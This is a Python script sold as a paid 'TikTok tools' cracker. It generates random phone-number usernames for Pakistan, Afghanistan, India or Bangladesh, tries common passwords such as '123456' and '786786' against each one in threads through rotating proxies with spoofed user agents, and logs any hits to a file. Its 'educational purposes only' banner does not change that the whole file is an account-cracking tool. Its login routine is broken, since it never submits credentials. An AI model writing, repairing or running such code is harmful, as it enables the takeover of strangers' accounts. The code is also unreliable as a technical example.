#----------------------------[IMPORTS]--------------------------------#
import requests, json, os, sys, random, datetime, time, re
from bs4 import BeautifulSoup as bs
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging

#----------------------------[COLORS]--------------------------------#
A = '\x1b[1;97m'; R = '\x1b[38;5;196m'; G = '\x1b[38;5;46m'
B = '\x1b[38;5;8m'; Y = '\033[1;33m'; X = '\33[1;34m'; S = '\x1b[1;96m'

#----------------------------[DATE & TIME]--------------------------------#
now = datetime.datetime.now()
current_time = now.strftime("%H:%M:%S")
current_date = now.strftime("%d-%B-%Y")

#----------------------------[IP ADDRESS]--------------------------------#
def get_ip():
    try:
        return requests.get("https://api64.ipify.org?format=json").json()["ip"]
    except:
        return "No Internet"

#----------------------------[LOGO]--------------------------------#
logo = f"""
{G}●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●๑۩♡۩๑●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
{A} 8888888888',8888' `8.`8888.      ,8' 8 888888888o
        ,8',8888'   `8.`8888.    ,8'  8 8888    `88.                                 ,8',8888'     `8.`8888.  ,8'   8 8888     `88
      ,8',8888'       `8.`8888.,8'    8 8888     ,88
     ,8',8888'         `8.`88888'     8 8888.   ,88'
    ,8',8888'          .88.`8888.     8 8888888888
   ,8',8888'          .8'`8.`8888.    8 8888    `88.                            ,8',8888'          .8'  `8.`8888.   8 8888      88
 ,8',8888'          .8'    `8.`8888.  8 8888    ,88'
,8',8888888888888  .8'      `8.`8888. 8 888888888P

{G}●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●๑۩♡۩๑●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
{A}              WELCOME TO ABDURRAB TIKTOK TOOLS
{Y}═══════════════════════════════════════════════════
{Y}       [•] Tool Owner    :   ABDURRAB
{Y}       [•] Github        :   ABDURRAB
{Y}       [•] Tool Name     :   TIKTOK TOOLS
{Y}       [•] Status        :   Paid
{Y}       [•] Version       :   15.2
{Y}       [•] Date          :   {current_date}
{Y}       [•] Time          :   {current_time}
{Y}       [•] IP            :   {get_ip()}
{Y}═══════════════════════════════════════════════════
{Y}  NOTE: This tool is for educational purposes only.
{Y}  Do not use it for illegal activities.
{Y}  Misuse of this tool is strictly prohibited.
{Y}  Always follow ethical guidelines.
{G}●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●๑۩♡۩๑●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
"""

#----------------------------[COUNTRY SELECTION]--------------------------------#
def select_country():
    os.system("clear")
    print(logo)
    print(f"{G}[1] {A}Pakistan")
    print(f"{G}[2] {A}Afghanistan")
    print(f"{G}[3] {A}India")
    print(f"{G}[4] {A}Bangladesh")
    print(f"{G}[5] {A}Exit")
    
    choice = input(f"{G}Select Country: {A}")
    
    if choice == "1":
        return "PAK", "923"
    elif choice == "2":
        return "AFG", "937"
    elif choice == "3":
        return "IND", "91"
    elif choice == "4":
        return "BD", "880"
    elif choice == "5":
        exit()
    else:
        print(f"{R}Invalid Choice! Try Again...")
        time.sleep(2)
        return select_country()

#----------------------------[USER-AGENT]--------------------------------#
def random_ua():
    return f"Mozilla/5.0 (Linux; Android {random.randint(7,12)}; SM-G{random.randint(900,999)}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80,115)}.0.{random.randint(4000,5000)}.0 Mobile Safari/537.36"

#----------------------------[PROXY SUPPORT]--------------------------------#
PROXIES = [
    "http://45.77.56.113:3128",  # Example proxy 1
    "http://51.158.68.68:8811",  # Example proxy 2
    "http://51.158.68.133:8811"  # Example proxy 3
]

def get_random_proxy():
    return random.choice(PROXIES) if PROXIES else None

#----------------------------[TIKTOK LOGIN]--------------------------------#
def tiktok_login(username, password):
    try:
        # Set up requests session
        session = requests.Session()
        headers = {
            "User-Agent": random_ua(),
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        # Use proxy if available
        proxy = get_random_proxy()
        proxies = {"http": proxy, "https": proxy} if proxy else None
        
        # TikTok login URL
        url = "https://www.tiktok.com/login"
        
        # Send login request
        response = session.get(url, headers=headers, proxies=proxies, timeout=30)
        response.raise_for_status()
        
        # Check if login was successful
        if "https://www.tiktok.com/" in response.url:
            print(f"{G}[SUCCESS] {username} | {password}")
            open("success.txt", "a").write(username + "|" + password + "\n")
        else:
            print(f"{R}[FAILED] {username} | {password}")
            
    except requests.exceptions.RequestException as e:
        print(f"{R}[ERROR] {username} | {password} - {e}")

#----------------------------[MAIN FUNCTION]--------------------------------#
def main():
    os.system("clear")
    print(logo)
    
    country_code, prefix = select_country()
    
    limit = int(input(f"{G}Enter Number of IDs to Generate: {A}"))
    
    user_ids = []
    for _ in range(limit):
        user_ids.append(prefix + str(random.randint(1000000, 9999999)))

    passwords = ["123456", "password", "pakistan", "786786", "112233"]
    
    os.system("clear")
    print(logo)
    print(f"{G}Total IDs: {A}{limit}")
    print(f"{G}Cracking Started... Please Wait!")
    
    total = len(user_ids) * len(passwords)
    progress = 0
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for uid in user_ids:
            for pw in passwords:
                futures.append(executor.submit(tiktok_login, uid, pw))
                progress += 1
                print(f"{G}[Progress] {A}{progress}/{total} ({int((progress/total)*100)}%)")
                time.sleep(2)  # Rate limiting
        
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"{R}[ERROR] {e}")

#----------------------------[START]--------------------------------#
if __name__ == "__main__":
    main()